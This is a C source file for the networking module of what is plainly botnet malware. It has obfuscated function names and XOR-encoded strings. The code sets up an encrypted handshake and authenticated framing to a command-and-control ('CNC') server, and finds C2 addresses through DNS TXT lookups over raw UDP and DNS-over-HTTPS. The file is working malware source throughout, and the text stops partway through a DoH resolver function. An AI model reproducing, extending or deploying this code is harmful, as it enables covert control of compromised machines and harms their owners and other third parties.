/* connection.c — Encrypted TCP connection module (pure C, GCC 4.1.2 compatible)
 *
 * EZF3 handshake, DNS resolution (DoH / raw UDP), DGA, HTTP GET,
 * C2 session handler (auth + command loop).
 */

#include "bot.h"

/* ======================================================================
   FORWARD DECLARATIONS / STATIC HELPERS
   ====================================================================== */

static void _Hh6mZ4r(int fd, int sec);
static int  tcp_connect(const char *host, const char *port, int timeout_sec);
static int  _FP6Wh5K(const char *domain, uint16_t qtype, uint8_t *buf, size_t bufsz);
static int  _Hv5xT6G(const uint8_t *resp, size_t resp_len, uint16_t qtype, strarr *out);

/* ======================================================================
   _Hh6mZ4r — set SO_RCVTIMEO + SO_SNDTIMEO on a socket
   ====================================================================== */

static void _Hh6mZ4r(int fd, int sec)
{
    struct timeval tv;
    tv.tv_sec  = sec;
    tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
}

/* ======================================================================
   tcp_connect — non-blocking connect with poll timeout
   ====================================================================== */

static int tcp_connect(const char *host, const char *port, int timeout_sec)
{
    struct addrinfo hints, *res, *rp;
    int fd, ret, err;
    socklen_t elen;
    struct pollfd pfd;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    ret = getaddrinfo(host, port, &hints, &res);
    if (ret != 0) {
        _nS5PJ8Y(_S(22,0xcb,0xc9,0xd8,0xcd,0xc8,0xc8,0xde,0xc5,0xc2,0xca,0xc3,0x84,0x89,0xdf,0x96,0x89,0xdf,0x85,0x96,0x8c,0x89,0xdf), host, port, gai_strerror(ret));
        return -1;
    }

    fd = -1;
    for (rp = res; rp != NULL; rp = rp->ai_next) {
        fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (fd < 0) continue;

        /* set non-blocking */
        {
            int flags = fcntl(fd, F_GETFL, 0);
            fcntl(fd, F_SETFL, flags | O_NONBLOCK);
        }

        ret = connect(fd, rp->ai_addr, rp->ai_addrlen);
        if (ret == 0) {
            /* connected immediately */
            int flags = fcntl(fd, F_GETFL, 0);
            fcntl(fd, F_SETFL, flags & ~O_NONBLOCK);
            break;
        }
        if (errno != EINPROGRESS) {
            close(fd);
            fd = -1;
            continue;
        }

        /* wait for connect with poll */
        pfd.fd     = fd;
        pfd.events = POLLOUT;
        ret = poll(&pfd, 1, timeout_sec * 1000);
        if (ret <= 0) {
            close(fd);
            fd = -1;
            continue;
        }

        /* check for connect error */
        elen = sizeof(err);
        err  = 0;
        getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &elen);
        if (err != 0) {
            close(fd);
            fd = -1;
            continue;
        }

        /* restore blocking mode */
        {
            int flags = fcntl(fd, F_GETFL, 0);
            fcntl(fd, F_SETFL, flags & ~O_NONBLOCK);
        }
        break;
    }

    freeaddrinfo(res);
    return fd;
}

/* ======================================================================
   gv4Kv3u — split "host:port" into dstr components
   ====================================================================== */

int gv4Kv3u(const char *addr, dstr *host, dstr *port)
{
    const char *colon;

    if (!addr || !host || !port) return 0;

    ds_init(host);
    ds_init(port);

    /* handle [ipv6]:port */
    if (addr[0] == '[') {
        const char *bracket = strchr(addr, ']');
        if (!bracket) return 0;
        ds_setn(host, addr + 1, (size_t)(bracket - addr - 1));
        if (bracket[1] == ':') {
            ds_set(port, bracket + 2);
        } else {
            ds_set(port, _S(3,0x98,0x98,0x9f));
        }
        return 1;
    }

    colon = strrchr(addr, ':');
    if (!colon) {
        ds_set(host, addr);
        ds_set(port, _S(3,0x98,0x98,0x9f));
        return 1;
    }

    ds_setn(host, addr, (size_t)(colon - addr));
    ds_set(port, colon + 1);
    return 1;
}

/* ======================================================================
   hq4zK8c — TCP connect + EZF3 encrypted handshake
   X25519 forward secrecy + HMAC-SHA256 key derivation
   ====================================================================== */

_EA8up4M *hq4zK8c(const char *host, const char *port)
{
    int fd;
    _EA8up4M *c;
    uint8_t client_nonce[32];
    uint8_t client_priv[32], client_pub[32];
    uint8_t server_nonce[32], server_pub[32];
    uint8_t handshake_buf[4 + 32 + 32]; /* "EZF3" + nonce + x25519_pub */
    uint8_t shared_secret[32];
    uint8_t session_key[32], key_c2s[32], key_s2c[32], hmac_key[32];
    uint8_t ikm[96]; /* client_nonce || server_nonce || shared_secret */
    ssize_t n;
    size_t off;

    _nS5PJ8Y(_S(35,0xc4,0xdd,0x98,0xd6,0xe7,0x94,0xcf,0x96,0x8c,0xcf,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0xc5,0xc2,0xcb,0x8c,0xd8,0xc3,0x8c,0x89,0xdf,0x96,0x89,0xdf,0x8c,0x84,0xe9,0xf6,0xea,0x9f,0x85), host, port);

    fd = tcp_connect(host, port, 15);
    if (fd < 0) {
        _nS5PJ8Y(_S(27,0xc4,0xdd,0x98,0xd6,0xe7,0x94,0xcf,0x96,0x8c,0xd8,0xcf,0xdc,0xf3,0xcf,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8));
        return NULL;
    }

    _Hh6mZ4r(fd, 10);

    /* Generate client nonce + ephemeral X25519 keypair */
    urandom_bytes(client_nonce, 32);
    urandom_bytes(client_priv, 32);
    _go6pR4p(client_pub, client_priv);

    /* Send "EZF3" + client_nonce + client_x25519_pub */
    memcpy(handshake_buf, _S(4,0xe9,0xf6,0xea,0x9f), 4);
    memcpy(handshake_buf + 4, client_nonce, 32);
    memcpy(handshake_buf + 36, client_pub, 32);

    off = 0;
    while (off < sizeof(handshake_buf)) {
        n = write(fd, handshake_buf + off, sizeof(handshake_buf) - off);
        if (n <= 0) {
            close(fd);
            goto cleanup_early;
        }
        off += (size_t)n;
    }

    /* Read server_nonce (32 bytes) + server_x25519_pub (32 bytes) */
    {
        uint8_t resp[64];
        off = 0;
        while (off < 64) {
            n = read(fd, resp + off, 64 - off);
            if (n <= 0) {
                close(fd);
                goto cleanup_early;
            }
            off += (size_t)n;
        }
        memcpy(server_nonce, resp, 32);
        memcpy(server_pub, resp + 32, 32);
    }

    /* Compute X25519 shared secret */
    _aw4Ma4u(shared_secret, client_priv, server_pub);

    /* Derive session key: HMAC-SHA256(sync_token, client_nonce || server_nonce || shared_secret) */
    memcpy(ikm, client_nonce, 32);
    memcpy(ikm + 32, server_nonce, 32);
    memcpy(ikm + 64, shared_secret, 32);
    DS4RR2W(); /* ensure sync token is decrypted */
    _no3nm7v((const uint8_t *)ds_cstr(&_Lv3Qk8T), ds_len(&_Lv3Qk8T), ikm, 96, session_key);

    /* Derive directional keys + HMAC key */
    _no3nm7v(session_key, 32, (const uint8_t *)_S(3,0xcf,0x9e,0xdf), 3, key_c2s);
    _no3nm7v(session_key, 32, (const uint8_t *)_S(3,0xdf,0x9e,0xcf), 3, key_s2c);
    _no3nm7v(session_key, 32, (const uint8_t *)_S(4,0xc4,0xc1,0xcd,0xcf), 4, hmac_key);

    /* Allocate _EA8up4M */
    c = (_EA8up4M *)malloc(sizeof(_EA8up4M));
    if (!c) {
        close(fd);
        goto cleanup_early;
    }

    c->fd      = fd;
    c->valid   = 1;
    c->rbuf    = NULL;
    c->rbuf_len = 0;
    c->rbuf_pos = 0;

    /* Init ciphers: send = c2s, recv = s2c */
    _BV3cU8N(&c->send_cipher, key_c2s);
    _BV3cU8N(&c->recv_cipher, key_s2c);
    memcpy(c->hmac_key, hmac_key, 32);

    /* Zero all sensitive locals */
    explicit_bzero(client_priv, 32);
    explicit_bzero(client_nonce, 32);
    explicit_bzero(server_nonce, 32);
    explicit_bzero(shared_secret, 32);
    explicit_bzero(session_key, 32);
    explicit_bzero(key_c2s, 32);
    explicit_bzero(key_s2c, 32);
    explicit_bzero(hmac_key, 32);
    explicit_bzero(ikm, 96);
    explicit_bzero(handshake_buf, sizeof(handshake_buf));

    _nS5PJ8Y(_S(55,0xc4,0xdd,0x98,0xd6,0xe7,0x94,0xcf,0x96,0x8c,0xe9,0xf6,0xea,0x9f,0x8c,0xc4,0xcd,0xc2,0xc8,0xdf,0xc4,0xcd,0xc7,0xc9,0x8c,0xcf,0xc3,0xc1,0xdc,0xc0,0xc9,0xd8,0xc9,0x8c,0x84,0xf4,0x9e,0x99,0x99,0x9d,0x95,0x8c,0x87,0x8c,0xe4,0xe1,0xed,0xef,0x81,0xff,0xe4,0xed,0x9e,0x99,0x9a,0x85));
    return c;

cleanup_early:
    explicit_bzero(client_priv, 32);
    explicit_bzero(client_nonce, 32);
    explicit_bzero(shared_secret, 32);
    explicit_bzero(session_key, 32);
    explicit_bzero(ikm, 96);
    explicit_bzero(handshake_buf, sizeof(handshake_buf));
    return NULL;
}

/* ======================================================================
   ZR8pH4D — close fd, free _EA8up4M
   ====================================================================== */

void ZR8pH4D(_EA8up4M *c)
{
    if (!c) return;
    if (c->fd >= 0) close(c->fd);
    c->valid = 0;
    explicit_bzero(&c->send_cipher, sizeof(c->send_cipher));
    explicit_bzero(&c->recv_cipher, sizeof(c->recv_cipher));
    explicit_bzero(c->hmac_key, 32);
    free(c->rbuf);
    c->rbuf = NULL;
    free(c);
}

/* ======================================================================
   Jf8pY4F — authenticated frame write
   Wire: [2-byte BE frameLen][ChaCha20(payload || HMAC-SHA256(hmac_key,payload)[0:16])]
   Matches CNC WriteFrame exactly.
   ====================================================================== */

void Jf8pY4F(_EA8up4M *c, const char *data, size_t len)
{
    uint8_t tag[32];
    uint8_t *frame;
    size_t frame_len;
    uint8_t header[2];
    size_t off;
    ssize_t n;

    if (!c || !c->valid || c->fd < 0 || len == 0) return;
    if (len > 0xFFFF - 16) return; /* frame too large */

    /* Compute HMAC-SHA256(hmac_key, payload), keep first 16 bytes */
    _no3nm7v(c->hmac_key, 32, (const uint8_t *)data, len, tag);

    frame_len = len + 16;
    frame = (uint8_t *)malloc(frame_len);
    if (!frame) return;

    memcpy(frame, data, len);
    memcpy(frame + len, tag, 16);
    explicit_bzero(tag, 32);

    /* Encrypt payload + tag in-place */
    if (_gF6Fb8W(&c->send_cipher, frame, frame_len) < 0) {
        free(frame);
        c->valid = 0;
        return;
    }

    /* Write 2-byte big-endian frame length */
    header[0] = (uint8_t)(frame_len >> 8);
    header[1] = (uint8_t)(frame_len & 0xFF);
    off = 0;
    while (off < 2) {
        n = write(c->fd, header + off, 2 - off);
        if (n <= 0) { c->valid = 0; free(frame); return; }
        off += (size_t)n;
    }

    /* Write encrypted frame */
    off = 0;
    while (off < frame_len) {
        n = write(c->fd, frame + off, frame_len - off);
        if (n <= 0) { c->valid = 0; break; }
        off += (size_t)n;
    }

    free(frame);
}

/* ======================================================================
   Ng2ZR5y — convenience: Jf8pY4F(c, str, strlen(str))
   ====================================================================== */

void Ng2ZR5y(_EA8up4M *c, const char *str)
{
    if (str) Jf8pY4F(c, str, strlen(str));
}

/* ======================================================================
   _read_frame — read one authenticated frame from the CNC into c->rbuf.
   Wire: [2-byte BE frameLen][ChaCha20(payload || HMAC-SHA256(hmac_key,payload)[0:16])]
   Matches CNC WriteFrame exactly.
   ====================================================================== */

static int _read_frame(_EA8up4M *c, int timeout_sec)
{
    uint8_t header[2];
    uint8_t *frame;
    size_t frame_len, payload_len;
    size_t off;
    ssize_t n;
    uint8_t expected_tag[32];
    int mismatch;
    size_t i;
    struct pollfd pfd;
    int ret;

    if (!c || !c->valid || c->fd < 0) return -1;

    /* Poll for first byte with caller's timeout */
    pfd.fd = c->fd;
    pfd.events = POLLIN;
    for (;;) {
        ret = poll(&pfd, 1, timeout_sec * 1000);
        if (ret < 0) {
            if (errno == EINTR) continue;
            c->valid = 0;
            return -1;
        }
        if (ret == 0) return -1; /* timeout */
        break;
    }

    /* Read 2-byte big-endian frame length */
    off = 0;
    while (off < 2) {
        n = read(c->fd, header + off, 2 - off);
        if (n < 0) { if (errno == EINTR) continue; c->valid = 0; return -1; }
        if (n == 0) { c->valid = 0; return -1; }
        off += (size_t)n;
    }

    frame_len = ((size_t)header[0] << 8) | header[1];
    if (frame_len < 16 || frame_len > 65551) { c->valid = 0; return -1; }

    frame = (uint8_t *)malloc(frame_len);
    if (!frame) { c->valid = 0; return -1; }

    /* Read the complete encrypted frame body */
    off = 0;
    while (off < frame_len) {
        n = read(c->fd, frame + off, frame_len - off);
        if (n < 0) { if (errno == EINTR) continue; c->valid = 0; free(frame); return -1; }
        if (n == 0) { c->valid = 0; free(frame); return -1; }
        off += (size_t)n;
    }

    /* Decrypt frame body */
    if (_gF6Fb8W(&c->recv_cipher, frame, frame_len) < 0) {
        c->valid = 0;
        free(frame);
        return -1;
    }

    payload_len = frame_len - 16;

    /* Verify HMAC-SHA256(hmac_key, payload)[0:16] */
    _no3nm7v(c->hmac_key, 32, frame, payload_len, expected_tag);
    mismatch = 0;
    for (i = 0; i < 16; i++) mismatch |= frame[payload_len + i] ^ expected_tag[i];
    explicit_bzero(expected_tag, 32);
    if (mismatch) { c->valid = 0; free(frame); return -1; }

    /* Store payload in receive buffer (truncate the 16-byte tag) */
    free(c->rbuf);
    c->rbuf     = frame;
    c->rbuf_len = payload_len;
    c->rbuf_pos = 0;
    return 0;
}

/* ======================================================================
   Un4Ss4D — accumulate bytes from the authenticated frame buffer until '\n'.
   Delegates to nb2Fg4N so all reads go through the HMAC-verified frame path.
   ====================================================================== */

dstr Un4Ss4D(_EA8up4M *c, int timeout_sec)
{
    dstr line;
    int b;

    ds_init(&line);
    if (!c || !c->valid || c->fd < 0) return line;

    for (;;) {
        b = nb2Fg4N(c, timeout_sec);
        if (b < 0) break;
        if (b == '\n') break;
        if (b != '\r') ds_catc(&line, (char)b);
    }

    return line;
}

/* ======================================================================
   nb2Fg4N — return one byte from the authenticated frame receive buffer.
   Refills the buffer by reading and verifying a new frame when empty.
   ====================================================================== */

int nb2Fg4N(_EA8up4M *c, int timeout_sec)
{
    if (!c || !c->valid || c->fd < 0) return -1;

    /* Serve from buffer if available */
    if (c->rbuf && c->rbuf_pos < c->rbuf_len)
        return (int)(unsigned char)c->rbuf[c->rbuf_pos++];

    /* Buffer exhausted — read and authenticate a new frame */
    if (_read_frame(c, timeout_sec) < 0) return -1;

    if (c->rbuf_pos < c->rbuf_len)
        return (int)(unsigned char)c->rbuf[c->rbuf_pos++];

    return -1;
}

/* ======================================================================
   AF6jH4z — read + decrypt exactly n bytes, returns 0 on success, -1 on error
   ====================================================================== */

int AF6jH4z(_EA8up4M *c, void *buf, size_t n, int timeout_sec)
{
    size_t got = 0;
    while (got < n) {
        int b = nb2Fg4N(c, timeout_sec);
        if (b < 0) return -1;
        ((uint8_t *)buf)[got++] = (uint8_t)b;
    }
    return 0;
}

/* ======================================================================
   SZ2yL5g — quick check (letters, digits, -, .)
   ====================================================================== */

int SZ2yL5g(const char *h)
{
    size_t len, i;
    int has_dot;

    if (!h || *h == '\0') return 0;

    len     = strlen(h);
    has_dot = 0;

    for (i = 0; i < len; i++) {
        char ch = h[i];
        if (ch == '.') { has_dot = 1; continue; }
        if (ch == '-' || ch == '_') continue;
        if (ch >= 'a' && ch <= 'z') continue;
        if (ch >= 'A' && ch <= 'Z') continue;
        if (ch >= '0' && ch <= '9') continue;
        return 0;
    }

    return has_dot;
}

/* ======================================================================
   kS6pU7n — split TXT data into "host:port" entries
   Expects comma-separated or newline-separated address list.
   ====================================================================== */

strarr kS6pU7n(const char *data)
{
    strarr result;
    const char *p;
    dstr token;

    sa_init(&result);
    if (!data || *data == '\0') return result;

    ds_init(&token);
    p = data;

    while (*p) {
        if (*p == ',' || *p == '\n' || *p == '\r' || *p == ';' || *p == ' ') {
            if (ds_len(&token) > 0) {
                /* must contain ':' */
                if (strchr(ds_cstr(&token), ':')) {
                    sa_pushds(&result, &token);
                }
                ds_clear(&token);
            }
            p++;
        } else {
            ds_catc(&token, *p);
            p++;
        }
    }

    if (ds_len(&token) > 0 && strchr(ds_cstr(&token), ':')) {
        sa_pushds(&result, &token);
    }

    ds_free(&token);
    return result;
}

/* ======================================================================
   Vc2mZ5Q — extract plain IPv4 addresses from TXT record data.
   Splits on comma, semicolon, space, newline. Validates each token
   with inet_pton so only real IPs are returned.
   ====================================================================== */

strarr Vc2mZ5Q(const char *data)
{
    strarr result;
    const char *p;
    dstr token;

    sa_init(&result);
    if (!data || *data == '\0') return result;

    ds_init(&token);
    p = data;

    while (*p) {
        if (*p == ',' || *p == ';' || *p == ' ' || *p == '\n' || *p == '\r' || *p == '\t') {
            if (ds_len(&token) > 0) {
                struct in_addr tmp;
                if (inet_pton(AF_INET, ds_cstr(&token), &tmp) == 1) {
                    sa_pushds(&result, &token);
                }
                ds_clear(&token);
            }
            p++;
        } else {
            ds_catc(&token, *p);
            p++;
        }
    }

    if (ds_len(&token) > 0) {
        struct in_addr tmp;
        if (inet_pton(AF_INET, ds_cstr(&token), &tmp) == 1) {
            sa_pushds(&result, &token);
        }
    }

    ds_free(&token);
    return result;
}

/* ======================================================================
   mQ2Yw7j — query TXT record for domain, return parsed IPs.
   Tries each resolver in _fx8Fz7F via raw UDP.
   ====================================================================== */

strarr mQ2Yw7j(const char *domain)
{
    strarr result;
    size_t i;

    sa_init(&result);
    if (!domain || *domain == '\0') return result;

    for (i = 0; i < sa_count(&_fx8Fz7F); i++) {
        strarr txts = Dc6Mh8n(domain, sa_get(&_fx8Fz7F, i));
        if (sa_count(&txts) > 0) {
            size_t j;
            for (j = 0; j < sa_count(&txts); j++) {
                strarr ips = Vc2mZ5Q(sa_get(&txts, j));
                sa_insert(&result, &ips);
                sa_free(&ips);
            }
            sa_free(&txts);
            if (sa_count(&result) > 0) return result;
        }
        sa_free(&txts);
    }

    return result;
}

/* ======================================================================
   DNS WIRE FORMAT — _FP6Wh5K / _Hv5xT6G
   ====================================================================== */

static int _FP6Wh5K(const char *domain, uint16_t qtype, uint8_t *buf, size_t bufsz)
{
    /* Build a raw DNS query packet for the given domain and query type.
     * Returns total packet length, or -1 on error. */
    size_t pos;
    const char *p, *dot;
    uint16_t txid;

    if (!domain || !buf || bufsz < 64) return -1;

    txid = (uint16_t)(urandom_u32() & 0xFFFF);

    /* header: 12 bytes */
    memset(buf, 0, 12);
    buf[0] = (uint8_t)(txid >> 8);
    buf[1] = (uint8_t)(txid & 0xFF);
    buf[2] = 0x01; /* RD=1 */
    buf[3] = 0x00;
    buf[4] = 0x00; buf[5] = 0x01; /* QDCOUNT=1 */

    pos = 12;

    /* encode domain labels */
    p = domain;
    while (*p) {
        size_t lablen;
        dot = strchr(p, '.');
        if (!dot) dot = p + strlen(p);
        lablen = (size_t)(dot - p);
        if (lablen == 0 || lablen > 63) return -1;
        if (pos + 1 + lablen >= bufsz) return -1;
        buf[pos++] = (uint8_t)lablen;
        memcpy(buf + pos, p, lablen);
        pos += lablen;
        p = (*dot) ? dot + 1 : dot;
    }
    if (pos >= bufsz) return -1;
    buf[pos++] = 0x00; /* root label */

    /* QTYPE + QCLASS */
    if (pos + 4 > bufsz) return -1;
    buf[pos++] = (uint8_t)(qtype >> 8);
    buf[pos++] = (uint8_t)(qtype & 0xFF);
    buf[pos++] = 0x00;
    buf[pos++] = 0x01; /* IN class */

    return (int)pos;
}

/* skip a DNS name (handles compression pointers) */
static int _cU2iD2p(const uint8_t *pkt, size_t pkt_len, size_t off)
{
    int jumps = 0;
    while (off < pkt_len) {
        uint8_t label = pkt[off];
        if (label == 0) { return (int)(off + 1); }
        if ((label & 0xC0) == 0xC0) {
            /* pointer — two bytes */
            return (int)(off + 2);
        }
        off += 1 + label;
        jumps++;
        if (jumps > 128) return -1;
    }
    return -1;
}

static int _Hv5xT6G(const uint8_t *resp, size_t resp_len, uint16_t qtype, strarr *out)
{
    uint16_t qdcount, ancount;
    size_t off;
    int i;

    if (resp_len < 12) return -1;

    qdcount = ((uint16_t)resp[4] << 8) | resp[5];
    ancount = ((uint16_t)resp[6] << 8) | resp[7];

    off = 12;

    /* skip question section */
    for (i = 0; i < (int)qdcount; i++) {
        int end = _cU2iD2p(resp, resp_len, off);
        if (end < 0) return -1;
        off = (size_t)end + 4; /* skip QTYPE + QCLASS */
        if (off > resp_len) return -1;
    }

    /* parse answers */
    for (i = 0; i < (int)ancount; i++) {
        uint16_t rtype, rclass, rdlen;
        int end;

        end = _cU2iD2p(resp, resp_len, off);
        if (end < 0) return -1;
        off = (size_t)end;

        if (off + 10 > resp_len) return -1;

        rtype  = ((uint16_t)resp[off] << 8) | resp[off + 1];
        rclass = ((uint16_t)resp[off + 2] << 8) | resp[off + 3];
        /* TTL at off+4..off+7 */
        rdlen  = ((uint16_t)resp[off + 8] << 8) | resp[off + 9];
        off += 10;

        if (off + rdlen > resp_len) return -1;

        if (rtype == qtype && rclass == 0x0001) {
            if (qtype == 16 /* TXT */) {
                /* TXT records: one or more length-prefixed strings */
                size_t roff = off;
                size_t rend = off + rdlen;
                dstr txt;
                ds_init(&txt);
                while (roff < rend) {
                    uint8_t slen = resp[roff++];
                    if (roff + slen > rend) break;
                    ds_catn(&txt, (const char *)(resp + roff), slen);
                    roff += slen;
                }
                if (ds_len(&txt) > 0) {
                    sa_pushds(out, &txt);
                }
                ds_free(&txt);
            } else if (qtype == 1 /* A */ && rdlen == 4) {
                char ipbuf[32];
                snprintf(ipbuf, sizeof(ipbuf), _S(11,0x89,0xc8,0x82,0x89,0xc8,0x82,0x89,0xc8,0x82,0x89,0xc8),
                         resp[off], resp[off+1], resp[off+2], resp[off+3]);
                sa_push(out, ipbuf);
            }
        }

        off += rdlen;
    }

    return (int)sa_count(out);
}

/* ======================================================================
   Dc6Mh8n — raw UDP DNS TXT query to a specific server
   ====================================================================== */

strarr Dc6Mh8n(const char *domain, const char *server)
{
    strarr result;
    uint8_t qbuf[512], rbuf[4096];
    int qlen, fd, ret;
    ssize_t rlen;
    struct sockaddr_in sa;
    struct pollfd pfd;
    dstr srv_host, srv_port;

    sa_init(&result);

    /* parse server address */
    ds_init(&srv_host);
    ds_init(&srv_port);
    if (!gv4Kv3u(server, &srv_host, &srv_port)) {
        ds_set(&srv_host, server);
        ds_set(&srv_port, _S(2,0x99,0x9f));
    }

    qlen = _FP6Wh5K(domain, 16 /* TXT */, qbuf, sizeof(qbuf));
    if (qlen < 0) {
        ds_free(&srv_host);
        ds_free(&srv_port);
        return result;
    }

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        ds_free(&srv_host);
        ds_free(&srv_port);
        return result;
    }

    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((uint16_t)atoi(ds_cstr(&srv_port)));
    inet_pton(AF_INET, ds_cstr(&srv_host), &sa.sin_addr);

    _nS5PJ8Y(_S(34,0xe8,0xcf,0x9a,0xe1,0xc4,0x94,0xc2,0x96,0x8c,0xdf,0xc9,0xc2,0xc8,0xc5,0xc2,0xcb,0x8c,0x89,0xc8,0x8c,0xce,0xd5,0xd8,0xc9,0xdf,0x8c,0xd8,0xc3,0x8c,0x89,0xdf,0x96,0x89,0xdf),
              qlen, ds_cstr(&srv_host), ds_cstr(&srv_port));

    ret = (int)sendto(fd, qbuf, (size_t)qlen, 0,
                      (struct sockaddr *)&sa, sizeof(sa));
    if (ret <= 0) {
        _nS5PJ8Y(_S(26,0xe8,0xcf,0x9a,0xe1,0xc4,0x94,0xc2,0x96,0x8c,0xdf,0xc9,0xc2,0xc8,0xd8,0xc3,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8,0x96,0x8c,0x89,0xdf), strerror(errno));
        close(fd);
        ds_free(&srv_host);
        ds_free(&srv_port);
        return result;
    }

    pfd.fd     = fd;
    pfd.events = POLLIN;
    ret = poll(&pfd, 1, 5000);
    if (ret > 0) {
        rlen = recvfrom(fd, rbuf, sizeof(rbuf), 0, NULL, NULL);
        _nS5PJ8Y(_S(36,0xe8,0xcf,0x9a,0xe1,0xc4,0x94,0xc2,0x96,0x8c,0xde,0xc9,0xcf,0xda,0xca,0xde,0xc3,0xc1,0x8c,0xde,0xc9,0xd8,0xd9,0xde,0xc2,0xc9,0xc8,0x8c,0x89,0xd6,0xc8,0x8c,0xce,0xd5,0xd8,0xc9,0xdf), rlen);
        if (rlen > 0) {
            _Hv5xT6G(rbuf, (size_t)rlen, 16, &result);
            _nS5PJ8Y(_S(31,0xe8,0xcf,0x9a,0xe1,0xc4,0x94,0xc2,0x96,0x8c,0xdc,0xcd,0xde,0xdf,0xc9,0xc8,0x8c,0x89,0xd6,0xd9,0x8c,0xf8,0xf4,0xf8,0x8c,0xde,0xc9,0xcf,0xc3,0xde,0xc8,0xdf), sa_count(&result));
        }
    } else {
        _nS5PJ8Y(_S(36,0xe8,0xcf,0x9a,0xe1,0xc4,0x94,0xc2,0x96,0x8c,0xdc,0xc3,0xc0,0xc0,0x8c,0xd8,0xc5,0xc1,0xc9,0xc3,0xd9,0xd8,0x83,0xc9,0xde,0xde,0xc3,0xde,0x8c,0x84,0xde,0xc9,0xd8,0x91,0x89,0xc8,0x85), ret);
    }

    close(fd);
    ds_free(&srv_host);
    ds_free(&srv_port);
    return result;
}

/* ======================================================================
   LF5UQ4v — DNS TXT lookup via system resolvers (iterates _fx8Fz7F)
   ====================================================================== */

strarr LF5UQ4v(const char *domain)
{
    strarr result;
    size_t i;

    sa_init(&result);

    _nS5PJ8Y(_S(38,0xe0,0xea,0x99,0xf9,0xfd,0x98,0xda,0x96,0x8c,0xde,0xc9,0xdf,0xc3,0xc0,0xda,0xc9,0xde,0xf3,0xdc,0xc3,0xc3,0xc0,0x8c,0xc4,0xcd,0xdf,0x8c,0x89,0xd6,0xd9,0x8c,0xc9,0xc2,0xd8,0xde,0xc5,0xc9,0xdf), sa_count(&_fx8Fz7F));
    for (i = 0; i < sa_count(&_fx8Fz7F); i++) {
        _nS5PJ8Y(_S(36,0xe0,0xea,0x99,0xf9,0xfd,0x98,0xda,0x96,0x8c,0xd8,0xde,0xd5,0xc5,0xc2,0xcb,0x8c,0xde,0xc9,0xdf,0xc3,0xc0,0xda,0xc9,0xde,0xf7,0x89,0xd6,0xd9,0xf1,0x8c,0x91,0x8c,0x8b,0x89,0xdf,0x8b), i, sa_get(&_fx8Fz7F, i));
        strarr r = Dc6Mh8n(domain, sa_get(&_fx8Fz7F, i));
        if (sa_count(&r) > 0) {
            sa_insert(&result, &r);
            sa_free(&r);
            break;
        }
        sa_free(&r);
    }

    return result;
}

/* ======================================================================
   Go3xC6n — DNS TXT lookup via DoH (DNS-over-HTTPS JSON API)
   Uses _fq5Hh7H and _GT2zC6e lists.
   ====================================================================== */

strarr Go3xC6n(const char *domain)
{
    strarr result;
    strarr *pools[2];
    int p;

    sa_init(&result);
    pools[0] = &_fq5Hh7H;
    pools[1] = &_GT2zC6e;

    for (p = 0; p < 2; p++) {
        size_t i;
        for (i = 0; i < sa_count(pools[p]); i++) {
            dstr url;
            dstr body;

            ds_init(&url);
            ds_set(&url, sa_get(pools[p], i));
            ds_cat(&url, _S(6,0x93,0xc2,0xcd,0xc1,0xc9,0x91));
            ds_cat(&url, domain);
            ds_cat(&url, _S(9,0x8a,0xd8,0xd5,0xdc,0xc9,0x91,0xf8,0xf4,0xf8));

            body = eS2nM4J(ds_cstr(&url), 10);
            ds_free(&url);

            if (ds_len(&body) > 0) {
                /* parse JSON-ish response for "data" fields containing quoted strings */
                const char *src = ds_cstr(&body);
                const char *dp;

                dp = src;
                while ((dp = strstr(dp, _S(6,0x8e,0xc8,0xcd,0xd8,0xcd,0x8e))) != NULL) {
                    const char *q1, *q2;
                    dp += 6;
                    /* find colon then quoted value */
                    q1 = strchr(dp, '\"');
                    if (!q1) break;
                    q1++;
                    /* skip leading quote that might be the TXT record wrapping */
                    if (*q1 == '\\' && *(q1 + 1) == '\"') q1 += 2;
                    q2 = strchr(q1, '\"');
                    if (!q2) break;
                    /* might have trailing escaped quote */
                    if (q2 > q1 && *(q2 - 1) == '\\') {
                        q2 = strchr(q2 + 1, '\"');
                        if (!q2) break;
                    }
                    {
                        dstr val;
                        ds_init(&val);
                        ds_setn(&val, q1, (size_t)(q2 - q1));
                        if (ds_len(&val) > 0) {
                            sa_pushds(&result, &val);
                        }
                        ds_free(&val);
                    }
                }

                ds_free(&body);
                if (sa_count(&result) > 0) return result;
            } else {
                ds_free(&body);
            }
        }
    }

    return result;
}

/* ======================================================================
   DR4Wt6N — resolve domain via DoH, return first A record IP
   ====================================================================== */

dstr DR4Wt6N(const char *domain)
{
    dstr ip;
    strarr *pools[2];
    int p;

    ds_init(&ip);
    pools[0] = &_fq5Hh7H;
    pools[1] = &_GT2zC6e;

    for (p = 0; p < 2; p++) {
        size_t i;
        for (i = 0; i < sa_count(pools[p]); i++) {
            dstr url, body;
            const char *src, *dp;

            ds_init(&url);
            ds_set(&url, sa_get(pools[p], i));
            ds_cat(&url, _S(6,0x93,0xc2,0xcd,0xc1,0xc9,0x91));
            ds_cat(&url, domain);
            ds_cat(&url, _S(7,0x8a,0xd8,0xd5,0xdc,0xc9,0x91,0xed));

            body = eS2nM4J(ds_cstr(&url), 10);
            ds_free(&url);

            if (ds_len(&body) == 0) {
                ds_free(&body);
                continue;
            }

            /* look for "data":"<IP>" in JSON response */
            src = ds_cstr(&body);
            dp  = strstr(src, _S(6,0x8e,0xc8,0xcd,0xd8,0xcd,0x8e));
            while (dp) {
                const char *q1, *q2;
                dp += 6;
                q1 = strchr(dp, '\"');
                if (!q1) break;
                q1++;
                q2 = strchr(q1, '\"');
                if (!q2) break;
                {
                    dstr cand;
                    ds_init(&cand);
                    ds_setn(&cand, q1, (size_t)(q2 - q1));
                    /* check if it looks like an IP */
                    {
                        struct in_addr tmp;
                        if (inet_pton(AF_INET, ds_cstr(&cand), &tmp) == 1) {
